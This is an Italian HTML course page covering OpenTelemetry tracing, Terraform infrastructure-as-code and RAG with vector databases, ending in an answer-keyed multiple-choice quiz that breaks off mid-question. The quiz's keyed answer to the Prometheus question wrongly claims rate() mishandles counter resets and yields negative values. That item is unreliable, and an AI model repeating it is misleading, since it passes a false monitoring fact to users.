            inventorySpan.setAttribute("inventory.available", available);

            if (!available) {
                inventorySpan.setStatus(StatusCode.ERROR, "Insufficient stock");
                throw new InsufficientStockException();
            }
        } finally {
            inventorySpan.end();
        }

        return createOrder(orderId, userId);
    }

    // Propagazione automatica via RestTemplate/WebClient instrumentati
    public UserDetails fetchUserDetails(String userId) {
        // Il trace context viene propagato automaticamente via headers:
        // traceparent: 00-{trace-id}-{span-id}-01
        return restTemplate.getForObject(
            "http://user-service/users/{id}",
            UserDetails.class,
            userId
        );
    }
}</code></pre>

                <h4>Architettura OpenTelemetry</h4>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────┐
│                         APPLICATION SERVICES                             │
├─────────────┬─────────────┬─────────────┬─────────────┬─────────────────┤
│ Order Svc   │ User Svc    │ Payment Svc │ Inventory   │ Notification    │
│   (OTel     │   (OTel     │   (OTel     │   (OTel     │   (OTel         │
│    SDK)     │    SDK)     │    SDK)     │    SDK)     │    SDK)         │
└──────┬──────┴──────┬──────┴──────┬──────┴──────┬──────┴────────┬────────┘
       │             │             │             │               │
       └─────────────┴──────┬──────┴─────────────┴───────────────┘
                            │
                            ▼
                 ┌─────────────────────┐
                 │  OpenTelemetry      │
                 │  Collector          │
                 │  ┌───────────────┐  │
                 │  │ Receivers     │  │  ← OTLP, Jaeger, Zipkin
                 │  │ Processors    │  │  ← Batch, Filter, Sampling
                 │  │ Exporters     │  │  ← Multi-backend
                 │  └───────────────┘  │
                 └──────────┬──────────┘
                            │
         ┌──────────────────┼──────────────────┐
         │                  │                  │
         ▼                  ▼                  ▼
  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
  │   Jaeger    │    │   Grafana   │    │  Datadog/   │
  │   (Traces)  │    │   Tempo     │    │  New Relic  │
  └─────────────┘    └─────────────┘    └─────────────┘
                    </pre>
                </div>

                <div class="info-box success">
                    <h4>Sampling Strategies</h4>
                    <p>In produzione con alto traffico, tracciare il 100% delle richieste è costoso. Le strategie di sampling includono:</p>
                    <ul>
                        <li><strong>Head-based sampling</strong>: Decidi all'inizio del trace se campionare (es. 10% delle richieste)</li>
                        <li><strong>Tail-based sampling</strong>: Decidi alla fine del trace, utile per catturare sempre errori o latenze alte</li>
                        <li><strong>Adaptive sampling</strong>: Campiona di più quando c'è meno traffico, di meno durante i picchi</li>
                    </ul>
                </div>

                <h3>Correlazione tra i Tre Pilastri</h3>

                <p>Il vero potere dell'observability emerge quando correli logs, metrics e traces. Il <strong>trace ID</strong> è la chiave che permette di collegare tutto:</p>

                <pre><code class="language-java">// Il trace ID appare ovunque:

// 1. Nei LOG (via MDC/SLF4J integration)
{
  "message": "Payment failed",
  "traceId": "abc123",
  "spanId": "def456",
  "userId": "user_789"
}

// 2. Nelle METRICS (come exemplar)
http_request_duration_seconds{status="500"} 2.5 # {traceId="abc123"}

// 3. Nei TRACES (ovviamente)
Trace abc123 → Span def456 → "Payment Service - charge"</code></pre>

                <p>Con questa correlazione, il workflow di debugging diventa:</p>
                <ol>
                    <li><strong>Alert</strong>: Prometheus rileva un picco di errori 5xx</li>
                    <li><strong>Metrics</strong>: Dashboard Grafana mostra latenza alta sul payment-service</li>
                    <li><strong>Traces</strong>: Drill-down su un trace lento, vedi che il problema è nella chiamata al payment gateway</li>
                    <li><strong>Logs</strong>: Filtri per trace ID, trovi il log esatto dell'errore con lo stack trace</li>
                </ol>
            </section>

            <!-- Infrastructure as Code Section -->
            <section class="section" id="modulo6-terraform">
                <h2>Infrastructure as Code con Terraform</h2>

                <p>L'<strong>Infrastructure as Code</strong> (IaC) è la pratica di gestire e provisioning l'infrastruttura attraverso file di configurazione versionabili, invece di processi manuali. Terraform è lo strumento IaC più diffuso, con supporto multi-cloud.</p>

                <h3>Perché Infrastructure as Code?</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Approccio Manuale</th>
                            <th>Infrastructure as Code</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Click nella console AWS/GCP/Azure</td>
                            <td>File di configurazione versionati in Git</td>
                        </tr>
                        <tr>
                            <td>"Funziona sul mio account"</td>
                            <td>Ambienti riproducibili (dev = staging = prod)</td>
                        </tr>
                        <tr>
                            <td>Chi ha modificato cosa?</td>
                            <td>Git history + terraform plan per review</td>
                        </tr>
                        <tr>
                            <td>Disaster recovery: "ricostruisco tutto a mano"</td>
                            <td>terraform apply e l'infrastruttura rinasce</td>
                        </tr>
                        <tr>
                            <td>Documentazione obsoleta</td>
                            <td>Il codice È la documentazione</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Terraform: Concetti Fondamentali</h3>

                <h4>HCL (HashiCorp Configuration Language)</h4>

                <p>Terraform usa <strong>HCL</strong>, un linguaggio dichiarativo dove descrivi lo stato desiderato dell'infrastruttura, non i passi per arrivarci.</p>

                <pre><code class="language-yaml"># main.tf - Esempio base: VPC + EC2 su AWS

terraform {
  required_version = ">= 1.5.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }

  # Backend remoto per lo state (collaborazione team)
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "eu-west-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"  # State locking
  }
}

provider "aws" {
  region = var.aws_region

  default_tags {
    tags = {
      Environment = var.environment
      ManagedBy   = "terraform"
      Project     = var.project_name
    }
  }
}

# Variables
variable "aws_region" {
  description = "AWS region for resources"
  type        = string
  default     = "eu-west-1"
}

variable "environment" {
  description = "Environment name (dev, staging, prod)"
  type        = string
}

variable "instance_type" {
  description = "EC2 instance type"
  type        = string
  default     = "t3.micro"

  validation {
    condition     = contains(["t3.micro", "t3.small", "t3.medium"], var.instance_type)
    error_message = "Instance type must be t3.micro, t3.small, or t3.medium."
  }
}</code></pre>

                <h4>Resources e Data Sources</h4>

                <pre><code class="language-yaml"># VPC e Networking
resource "aws_vpc" "main" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true

  tags = {
    Name = "${var.project_name}-vpc"
  }
}

resource "aws_subnet" "public" {
  count             = 2
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.${count.index + 1}.0/24"
  availability_zone = data.aws_availability_zones.available.names[count.index]

  map_public_ip_on_launch = true

  tags = {
    Name = "${var.project_name}-public-${count.index + 1}"
    Type = "public"
  }
}

# Data source: legge dati esistenti (non crea risorse)
data "aws_availability_zones" "available" {
  state = "available"
}

data "aws_ami" "amazon_linux" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

# EC2 Instance
resource "aws_instance" "app" {
  ami                    = data.aws_ami.amazon_linux.id
  instance_type          = var.instance_type
  subnet_id              = aws_subnet.public[0].id
  vpc_security_group_ids = [aws_security_group.app.id]

  user_data = &lt;&lt;-EOF
    #!/bin/bash
    yum update -y
    yum install -y docker
    systemctl start docker
    systemctl enable docker
  EOF

  tags = {
    Name = "${var.project_name}-app-server"
  }

  lifecycle {
    create_before_destroy = true
  }
}

# Security Group
resource "aws_security_group" "app" {
  name        = "${var.project_name}-app-sg"
  description = "Security group for application servers"
  vpc_id      = aws_vpc.main.id

  ingress {
    description = "HTTP"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    description = "HTTPS"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# Outputs
output "instance_public_ip" {
  description = "Public IP of the EC2 instance"
  value       = aws_instance.app.public_ip
}

output "vpc_id" {
  description = "ID of the VPC"
  value       = aws_vpc.main.id
}</code></pre>

                <h3>Terraform Workflow</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────┐
│                        TERRAFORM WORKFLOW                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. WRITE          2. PLAN           3. APPLY          4. DESTROY       │
│  ─────────         ────────          ─────────         ───────────      │
│                                                                          │
│  ┌─────────┐      ┌─────────┐       ┌─────────┐       ┌─────────┐      │
│  │ .tf     │ ───▶ │terraform│ ───▶  │terraform│ ───▶  │terraform│      │
│  │ files   │      │  plan   │       │  apply  │       │ destroy │      │
│  └─────────┘      └────┬────┘       └────┬────┘       └─────────┘      │
│                        │                 │                               │
│                        ▼                 ▼                               │
│                   ┌─────────┐       ┌─────────┐                         │
│                   │ Execution│       │  State  │                         │
│                   │   Plan   │       │  File   │                         │
│                   │(preview) │       │(.tfstate)│                        │
│                   └─────────┘       └─────────┘                         │
│                                                                          │
│  "Cosa voglio"   "Cosa cambierà"  "Applica"      "Distruggi tutto"     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-bash"># Inizializza il working directory (scarica providers, configura backend)
terraform init

# Mostra cosa verrà creato/modificato/distrutto (DRY RUN)
terraform plan -out=tfplan

# Applica le modifiche (crea/modifica l'infrastruttura reale)
terraform apply tfplan

# Mostra lo stato corrente
terraform show

# Lista tutte le risorse gestite
terraform state list

# Distrugge TUTTA l'infrastruttura (ATTENZIONE!)
terraform destroy</code></pre>

                <h3>Terraform State: Il Cuore di Terraform</h3>

                <p>Il <strong>state file</strong> (<code>terraform.tfstate</code>) è il database di Terraform: mappa le risorse nel codice alle risorse reali nel cloud. Senza lo state, Terraform non saprebbe cosa esiste già e cosa deve creare.</p>

                <div class="info-box warning">
                    <h4>State File: Trattalo con Cura!</h4>
                    <ul>
                        <li><strong>Contiene secrets</strong>: password DB, chiavi API in plain text. MAI committarlo in Git!</li>
                        <li><strong>Remote backend obbligatorio per team</strong>: S3 + DynamoDB (locking), Terraform Cloud, GCS</li>
                        <li><strong>State locking</strong>: Previene modifiche concorrenti che corromperebbero lo state</li>
                        <li><strong>State backup</strong>: Abilita versioning sul bucket S3</li>
                    </ul>
                </div>

                <h3>Terraform Modules: Riusabilità</h3>

                <p>I <strong>modules</strong> sono container riusabili di risorse Terraform. Invece di copiare codice, crei un modulo e lo richiami con parametri diversi.</p>

                <pre><code class="language-yaml"># modules/vpc/main.tf
variable "cidr_block" {
  type = string
}

variable "environment" {
  type = string
}

resource "aws_vpc" "this" {
  cidr_block = var.cidr_block

  tags = {
    Name        = "${var.environment}-vpc"
    Environment = var.environment
  }
}

output "vpc_id" {
  value = aws_vpc.this.id
}

# ─────────────────────────────────────────────

# environments/prod/main.tf - Uso del modulo
module "vpc" {
  source = "../../modules/vpc"

  cidr_block  = "10.0.0.0/16"
  environment = "prod"
}

module "vpc_staging" {
  source = "../../modules/vpc"

  cidr_block  = "10.1.0.0/16"
  environment = "staging"
}

# Puoi anche usare moduli dalla Terraform Registry
module "eks" {
  source  = "terraform-aws-modules/eks/aws"
  version = "~> 19.0"

  cluster_name    = "my-cluster"
  cluster_version = "1.28"
  # ... altri parametri
}</code></pre>

                <h3>Best Practices Terraform</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Practice</th>
                            <th>Descrizione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Remote State</strong></td>
                            <td>Usa sempre un backend remoto (S3, GCS, Terraform Cloud) per collaborazione e locking</td>
                        </tr>
                        <tr>
                            <td><strong>State per Environment</strong></td>
                            <td>Separa lo state per ambiente (dev, staging, prod) per isolamento e blast radius ridotto</td>
                        </tr>
                        <tr>
                            <td><strong>Plan in CI/CD</strong></td>
                            <td>terraform plan automatico su ogni PR, apply solo dopo merge/approval</td>
                        </tr>
                        <tr>
                            <td><strong>Lock Versions</strong></td>
                            <td>Specifica versioni esatte di Terraform e providers nel required_providers</td>
                        </tr>
                        <tr>
                            <td><strong>Use Modules</strong></td>
                            <td>Non ripetere codice: crea moduli per pattern comuni (VPC, EKS, RDS)</td>
                        </tr>
                        <tr>
                            <td><strong>Validate & Format</strong></td>
                            <td>terraform validate e terraform fmt in pre-commit hooks</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- LLM & AI Integration Section -->
            <section class="section" id="modulo6-ai">
                <h2>LLM & AI Integration nelle Applicazioni</h2>

                <p>L'integrazione di <strong>Large Language Models</strong> (LLM) nelle applicazioni enterprise è una delle competenze più richieste nel 2026. Questa sezione copre i pattern architetturali fondamentali: <strong>RAG</strong>, <strong>Vector Databases</strong> e <strong>Embeddings</strong>.</p>

                <h3>Il Problema: Limitazioni degli LLM</h3>

                <p>Gli LLM come GPT-4, Claude, Llama hanno limitazioni significative per applicazioni enterprise:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Limitazione</th>
                            <th>Problema</th>
                            <th>Soluzione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Knowledge Cutoff</strong></td>
                            <td>Non conoscono eventi dopo il training</td>
                            <td>RAG con dati aggiornati</td>
                        </tr>
                        <tr>
                            <td><strong>No Private Data</strong></td>
                            <td>Non conoscono i tuoi documenti interni</td>
                            <td>RAG con knowledge base aziendale</td>
                        </tr>
                        <tr>
                            <td><strong>Hallucinations</strong></td>
                            <td>Inventano informazioni plausibili ma false</td>
                            <td>RAG + citazione fonti</td>
                        </tr>
                        <tr>
                            <td><strong>Context Window</strong></td>
                            <td>Limite di token per richiesta (es. 128K)</td>
                            <td>Retrieval selettivo dei chunk rilevanti</td>
                        </tr>
                    </tbody>
                </table>

                <h3>RAG: Retrieval Augmented Generation</h3>

                <p><strong>RAG</strong> è un pattern architetturale che combina la potenza generativa degli LLM con la precisione del retrieval da una knowledge base. Invece di fare fine-tuning (costoso, lento), "aumenti" il prompt con contesto rilevante recuperato al momento.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                          RAG ARCHITECTURE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────────────── INDEXING PIPELINE ───────────────────────┐│
│  │                                                                          ││
│  │  Documents    ──▶   Chunking    ──▶   Embedding   ──▶   Vector DB       ││
│  │  (PDF, HTML,       (Split into       Model            (Store vectors    ││
│  │   Markdown)         ~512 tokens)     (ada-002,         + metadata)      ││
│  │                                       all-MiniLM)                        ││
│  └──────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
│  ┌─────────────────────────────── QUERY PIPELINE ──────────────────────────┐│
│  │                                                                          ││
│  │  User Query ─┬──▶ Embed Query ──▶ Similarity  ──▶ Top-K    ──▶ Prompt  ││
│  │              │                     Search         Chunks       Builder  ││
│  │              │                     (Vector DB)                          ││
│  │              │                                                          ││
│  │              │    ┌─────────────────────────────────────────────────┐   ││
│  │              │    │  AUGMENTED PROMPT                               │   ││
│  │              │    │  ─────────────────                               │   ││
│  │              │    │  Context:                                        │   ││
│  │              │    │  [Chunk 1: "La policy aziendale prevede..."]     │   ││
│  │              │    │  [Chunk 2: "Il processo di rimborso..."]         │   ││
│  │              │    │                                                  │   ││
│  │              └───▶│  Question: "Come richiedo un rimborso?"          │   ││
│  │                   │                                                  │   ││
│  │                   │  Instructions: Rispondi basandoti solo sul      │   ││
│  │                   │  contesto fornito. Cita le fonti.               │   ││
│  │                   └────────────────────────┬────────────────────────┘   ││
│  │                                            │                            ││
│  │                                            ▼                            ││
│  │                                    ┌──────────────┐                     ││
│  │                                    │     LLM      │                     ││
│  │                                    │  (GPT-4,     │                     ││
│  │                                    │   Claude)    │                     ││
│  │                                    └──────┬───────┘                     ││
│  │                                           │                             ││
│  │                                           ▼                             ││
│  │                                    Response with                        ││
│  │                                    citations                            ││
│  └──────────────────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h4>Embeddings: Il Cuore Semantico</h4>

                <p>Gli <strong>embeddings</strong> sono rappresentazioni numeriche (vettori) del significato semantico del testo. Testi con significato simile hanno vettori "vicini" nello spazio multidimensionale.</p>

                <pre><code class="language-java">// Esempio concettuale di embeddings
"Come richiedere un rimborso?"  → [0.12, -0.34, 0.87, ..., 0.23]  // 1536 dimensioni
"Procedura per il refund"       → [0.11, -0.35, 0.85, ..., 0.24]  // Molto simile!
"Meteo di domani"               → [0.92, 0.11, -0.45, ..., 0.78]  // Molto diverso

// Cosine similarity
similarity("rimborso", "refund") = 0.95  // Alta
similarity("rimborso", "meteo")  = 0.12  // Bassa</code></pre>

                <h4>Implementazione RAG con Spring AI</h4>

                <pre><code class="language-java">// pom.xml
// spring-ai-openai-spring-boot-starter
// spring-ai-pgvector-store-spring-boot-starter

@Configuration
public class RagConfig {

    @Bean
    public EmbeddingModel embeddingModel() {
        return new OpenAiEmbeddingModel(
            new OpenAiApi(System.getenv("OPENAI_API_KEY"))
        );
    }

    @Bean
    public VectorStore vectorStore(EmbeddingModel embeddingModel, JdbcTemplate jdbc) {
        return new PgVectorStore(jdbc, embeddingModel);
    }
}

@Service
public class DocumentIngestionService {

    private final VectorStore vectorStore;

    // 1. INDEXING: Carica documenti nel vector store
    public void ingestDocuments(List&lt;Resource&gt; documents) {
        // Text Splitter: divide documenti in chunks
        TokenTextSplitter splitter = new TokenTextSplitter(
            500,    // chunk size (tokens)
            100,    // overlap (per mantenere contesto)
            5,      // min chunk size
            10000,  // max chunks per doc
            true    // keep separator
        );

        for (Resource doc : documents) {
            // Parse document (PDF, HTML, etc.)
            TikaDocumentReader reader = new TikaDocumentReader(doc);
            List&lt;Document&gt; parsed = reader.get();

            // Split in chunks
            List&lt;Document&gt; chunks = splitter.apply(parsed);

            // Add metadata per ogni chunk
            chunks.forEach(chunk -> {
                chunk.getMetadata().put("source", doc.getFilename());
                chunk.getMetadata().put("ingested_at", Instant.now().toString());
            });

            // Store: embedding automatico + salvataggio in vector DB
            vectorStore.add(chunks);
        }
    }
}

@Service
public class RagChatService {

    private final VectorStore vectorStore;
    private final ChatClient chatClient;

    // 2. RETRIEVAL + GENERATION
    public String askQuestion(String userQuestion) {
        // Similarity search nel vector store
        List&lt;Document&gt; relevantDocs = vectorStore.similaritySearch(
            SearchRequest.query(userQuestion)
                .withTopK(5)                    // Top 5 chunks più rilevanti
                .withSimilarityThreshold(0.7)  // Soglia minima di similarità
        );

        // Costruisci il prompt con contesto
        String context = relevantDocs.stream()
            .map(doc -> String.format(
                "[Source: %s]\n%s",
                doc.getMetadata().get("source"),
                doc.getContent()
            ))
            .collect(Collectors.joining("\n\n---\n\n"));

        String systemPrompt = """
            Sei un assistente aziendale. Rispondi alle domande basandoti
            ESCLUSIVAMENTE sul contesto fornito. Se l'informazione non è
            nel contesto, rispondi "Non ho informazioni su questo argomento".
            Cita sempre la fonte tra parentesi [Source: nomefile].
            """;

        String userPrompt = String.format("""
            CONTESTO:
            %s

            DOMANDA:
            %s
            """, context, userQuestion);

        // Chiamata LLM
        return chatClient.prompt()
            .system(systemPrompt)
            .user(userPrompt)
            .call()
            .content();
    }
}</code></pre>

                <h3>Vector Databases: Dove Vivono gli Embeddings</h3>

                <p>I <strong>Vector Databases</strong> sono database specializzati per storage e ricerca efficiente di vettori ad alta dimensionalità. Usano algoritmi come <strong>HNSW</strong> (Hierarchical Navigable Small World) o <strong>IVF</strong> (Inverted File Index) per ricerca approssimata in tempo sub-lineare.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Database</th>
                            <th>Tipo</th>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Pinecone</strong></td>
                            <td>Managed SaaS</td>
                            <td>Zero ops, scalabile, filtering metadata</td>
                            <td>Vendor lock-in, costo</td>
                        </tr>
                        <tr>
                            <td><strong>Weaviate</strong></td>
                            <td>Open source</td>
                            <td>GraphQL API, hybrid search, self-hosted</td>
                            <td>Più complesso da gestire</td>
                        </tr>
                        <tr>
                            <td><strong>Milvus</strong></td>
                            <td>Open source</td>
                            <td>Altamente scalabile, multi-index</td>
                            <td>Curva di apprendimento</td>
                        </tr>
                        <tr>
                            <td><strong>pgvector</strong></td>
                            <td>PostgreSQL extension</td>
                            <td>Usa il DB esistente, ACID, SQL familiare</td>
                            <td>Performance limitate su scala molto grande</td>
                        </tr>
                        <tr>
                            <td><strong>Qdrant</strong></td>
                            <td>Open source</td>
                            <td>Rust (performance), filtering avanzato</td>
                            <td>Ecosistema più giovane</td>
                        </tr>
                    </tbody>
                </table>

                <h4>pgvector: Vector Search in PostgreSQL</h4>

                <pre><code class="language-sql">-- Abilita l'estensione
CREATE EXTENSION IF NOT EXISTS vector;

-- Tabella per documenti con embedding
CREATE TABLE documents (
    id SERIAL PRIMARY KEY,
    content TEXT NOT NULL,
    metadata JSONB,
    embedding vector(1536),  -- OpenAI ada-002 = 1536 dimensioni
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Indice per ricerca veloce (HNSW)
CREATE INDEX ON documents
USING hnsw (embedding vector_cosine_ops)
WITH (m = 16, ef_construction = 64);

-- Query: trova i 5 documenti più simili
SELECT id, content, metadata,
       1 - (embedding &lt;=&gt; '[0.12, -0.34, ...]'::vector) AS similarity
FROM documents
WHERE metadata->>'category' = 'policies'  -- Filtering
ORDER BY embedding &lt;=&gt; '[0.12, -0.34, ...]'::vector
LIMIT 5;</code></pre>

                <h3>Advanced RAG Patterns</h3>

                <div class="info-box">
                    <h4>Chunking Strategies</h4>
                    <p>La qualità del RAG dipende molto da come dividi i documenti:</p>
                    <ul>
                        <li><strong>Fixed-size chunks</strong>: Semplice, ma può tagliare frasi a metà</li>
                        <li><strong>Sentence-based</strong>: Rispetta i confini delle frasi</li>
                        <li><strong>Recursive/Hierarchical</strong>: Prova separatori diversi (paragrafo → frase → caratteri)</li>
                        <li><strong>Semantic chunking</strong>: Usa embedding per trovare punti di rottura naturali</li>
                    </ul>
                </div>

                <h4>Hybrid Search: Best of Both Worlds</h4>

                <p>La <strong>Hybrid Search</strong> combina ricerca semantica (vector) con ricerca keyword (BM25/full-text). Utile quando l'utente cerca termini esatti (codici prodotto, nomi) che la ricerca semantica potrebbe perdere.</p>

                <pre><code class="language-java">// Pseudo-codice Hybrid Search
public List&lt;Document&gt; hybridSearch(String query) {
    // 1. Vector search (semantica)
    List&lt;Document&gt; semanticResults = vectorStore.similaritySearch(query, topK=10);

    // 2. Keyword search (BM25/full-text)
    List&lt;Document&gt; keywordResults = fullTextSearch(query, topK=10);

    // 3. Reciprocal Rank Fusion (RRF) - combina i ranking
    Map&lt;String, Double&gt; scores = new HashMap&lt;&gt;();
    int k = 60; // parametro RRF

    for (int i = 0; i &lt; semanticResults.size(); i++) {
        String id = semanticResults.get(i).getId();
        scores.merge(id, 1.0 / (k + i + 1), Double::sum);
    }

    for (int i = 0; i &lt; keywordResults.size(); i++) {
        String id = keywordResults.get(i).getId();
        scores.merge(id, 1.0 / (k + i + 1), Double::sum);
    }

    // 4. Ordina per score combinato
    return scores.entrySet().stream()
        .sorted(Map.Entry.&lt;String, Double&gt;comparingByValue().reversed())
        .limit(5)
        .map(e -> getDocumentById(e.getKey()))
        .toList();
}</code></pre>

                <h4>Query Transformation</h4>

                <p>A volte la query dell'utente è troppo vaga o ambigua. Tecniche di <strong>query transformation</strong>:</p>

                <ul>
                    <li><strong>Query Expansion</strong>: Usa l'LLM per generare query alternative ("rimborso" → "rimborso", "refund", "restituzione denaro")</li>
                    <li><strong>HyDE (Hypothetical Document Embedding)</strong>: Genera un documento ipotetico che risponderebbe alla query, poi cerca documenti simili a quello</li>
                    <li><strong>Step-back Prompting</strong>: Risali a una domanda più generale prima di cercare</li>
                </ul>

                <h3>Considerazioni Architetturali</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>Considerazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Latency</strong></td>
                            <td>RAG aggiunge ~200-500ms (embedding query + vector search). Cache le query frequenti.</td>
                        </tr>
                        <tr>
                            <td><strong>Cost</strong></td>
                            <td>Embedding: ~$0.0001/1K tokens. LLM: ~$0.01-0.03/1K tokens. Il contesto RAG aumenta i token.</td>
                        </tr>
                        <tr>
                            <td><strong>Freshness</strong></td>
                            <td>I documenti cambiano? Implementa pipeline di re-indexing (incrementale o full).</td>
                        </tr>
                        <tr>
                            <td><strong>Security</strong></td>
                            <td>Access control: filtra risultati per permessi utente. Non esporre dati sensibili nel contesto.</td>
                        </tr>
                        <tr>
                            <td><strong>Evaluation</strong></td>
                            <td>Metriche: Retrieval accuracy (hai trovato i chunk giusti?), Answer quality, Hallucination rate.</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- Quiz Section Modulo 6 -->
            <section class="quiz-section" id="modulo6-quiz">
                <h2>Interactive Challenge Quiz - Modulo 6</h2>
                <p>Verifica la tua comprensione degli Advanced Topics 2026 con queste domande di livello Hard.</p>

                <!-- Question 26 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> In un sistema con OpenTelemetry, hai configurato il sampling al 10%. Un trace inizia nel servizio A, chiama B, poi C. Il trace è stato selezionato per il sampling in A. Cosa succede in B e C?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q26" id="q26a" value="a">
                            <label for="q26a">B e C fanno sampling indipendente: potrebbero non tracciare le loro parti</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q26" id="q26b" value="b">
                            <label for="q26b">B e C tracciano sempre perché il sampling si applica solo all'entry point</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q26" id="q26c" value="c">
                            <label for="q26c">B e C ereditano la decisione di sampling da A via context propagation</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q26" id="q26d" value="d">
                            <label for="q26d">B e C controllano il collector centrale per decidere se tracciare</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q26')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q26"></div>
                </div>

                <!-- Question 27 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Stai facendo terraform plan e vedi: <code>aws_instance.app must be replaced</code>. Cosa significa e perché è importante?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q27" id="q27a" value="a">
                            <label for="q27a">L'istanza verrà aggiornata in-place con le nuove configurazioni</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q27" id="q27b" value="b">
                            <label for="q27b">L'istanza verrà distrutta e ricreata, causando downtime se non gestito</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q27" id="q27c" value="c">
                            <label for="q27c">Terraform creerà una nuova istanza mantenendo la vecchia come backup</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q27" id="q27d" value="d">
                            <label for="q27d">È solo un warning: l'istanza non verrà modificata senza conferma esplicita</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q27')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q27"></div>
                </div>

                <!-- Question 28 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Nel tuo sistema RAG, gli utenti si lamentano che le risposte non trovano informazioni che sai essere nei documenti. La similarity threshold è 0.8. L'embedding model usa cosine similarity. Quale potrebbe essere il problema?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q28" id="q28a" value="a">
                            <label for="q28a">I documenti sono troppo lunghi e superano la context window</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q28" id="q28b" value="b">
                            <label for="q28b">Il vector database non ha abbastanza memoria per tutti gli embeddings</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q28" id="q28c" value="c">
                            <label for="q28c">L'LLM sta allucinando invece di usare il contesto fornito</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q28" id="q28d" value="d">
                            <label for="q28d">La threshold 0.8 è troppo alta: query diverse nel wording ma simili nel significato vengono scartate</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q28')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q28"></div>
                </div>

                <!-- Question 29 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> Il tuo Prometheus mostra che http_requests_total ha avuto un reset (drop a 0) alle 14:32. La query <code>rate(http_requests_total[5m])</code> alle 14:35 restituisce valori negativi. Perché e come risolvi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q29" id="q29a" value="a">
                            <label for="q29a">rate() non gestisce i reset: usa increase() o irate() che compensano automaticamente</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q29" id="q29b" value="b">
                            <label for="q29b">Il counter è stato implementato male: dovrebbe usare un Gauge invece</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q29" id="q29c" value="c">
                            <label for="q29c">Prometheus ha un bug: i counter non dovrebbero mai resettarsi</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q29" id="q29d" value="d">
                            <label for="q29d">Devi aggiungere un filtro per escludere i punti dopo il reset</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q29')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q29"></div>
                </div>

                <!-- Question 30 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Due sviluppatori eseguono terraform apply contemporaneamente sullo stesso state (senza state locking). Dev1 aggiunge una subnet, Dev2 modifica un security group. Qual è il rischio?</h4>
                    <div class="quiz-options">
